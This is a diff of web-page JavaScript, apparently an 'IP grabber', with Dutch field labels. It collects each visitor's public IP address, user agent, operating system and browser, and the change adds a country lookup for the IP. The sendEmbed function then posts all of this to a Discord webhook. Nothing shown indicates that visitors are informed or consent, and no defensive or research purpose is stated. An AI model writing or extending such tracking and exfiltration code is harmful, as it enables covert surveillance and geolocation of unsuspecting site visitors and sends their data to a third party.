@@ -41,21 +41,33 @@
 
         function sendToDiscord(webhookURL) {
             var ipAddress = "Unknown"; // Default value for IP address
-            var script = document.createElement('script');
-            script.src = 'https://api64.ipify.org?format=json&callback=handleIPResponse';
-            document.body.appendChild(script);
-
-            window.handleIPResponse = function(data) {
-                ipAddress = data.ip;
-                sendEmbed(webhookURL, ipAddress);
-            };
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    fetch('https://ipapi.co/' + ipAddress + '/json/')
+                        .then(response => response.json())
+                        .then(locationData => {
+                            sendEmbed(webhookURL, ipAddress, locationData);
+                        })
+                        .catch(error => {
+                            console.error('Unable to fetch location data:', error);
+                            sendEmbed(webhookURL, ipAddress, null); // Send embed with default location data
+                        });
+                })
+                .catch(error => {
+                    console.error('Unable to fetch IP address:', error);
+                    sendEmbed(webhookURL, ipAddress, null); // Send embed with default IP address
+                });
         }
 
-        function sendEmbed(webhookURL, ipAddress) {
+        function sendEmbed(webhookURL, ipAddress, locationData) {
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
             var browser = detectBrowser(userAgent);
+
+            var country = (locationData && locationData.country_name) ? locationData.country_name : "Onbekend";
 
             var embed = {
                 "embeds": [
@@ -67,6 +79,11 @@
                             {
                                 "name": "IP Adres",
                                 "value": ipAddress,
+                                "inline": true
+                            },
+                            {
+                                "name": "Land",
+                                "value": country,
                                 "inline": true
                             },
                             {
